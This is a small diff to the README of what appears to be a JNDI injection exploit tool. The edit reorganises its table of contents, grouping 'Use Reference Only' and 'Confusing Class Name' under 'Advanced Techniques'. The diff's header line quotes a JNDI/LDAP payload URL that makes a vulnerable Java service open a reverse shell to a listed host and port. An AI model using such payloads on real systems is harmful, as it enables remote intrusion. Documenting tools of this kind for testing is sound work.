@@ -76,8 +76,9 @@ ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
 - [Tomcat Blind XXE](USAGE.en.md#tomcat-blind-xxe)
 - [LDAP Deserialization](USAGE.en.md#ldap-deserialization)
 - [Script](USAGE.en.md#script)
-- [useReferenceOnly](USAGE.en.md#usereferenceonly)
-- [fakeClassName](USAGE.md#fakeclassname)
+- [Advanced Techniques](USAGE.en.md#advanced-techniques)
+  - [Use Reference Only](USAGE.en.md#use-reference-only)
+  - [Confusing Class Name](USAGE.md#confusing-class-name)
 
 ## ⚙️ Compile
 
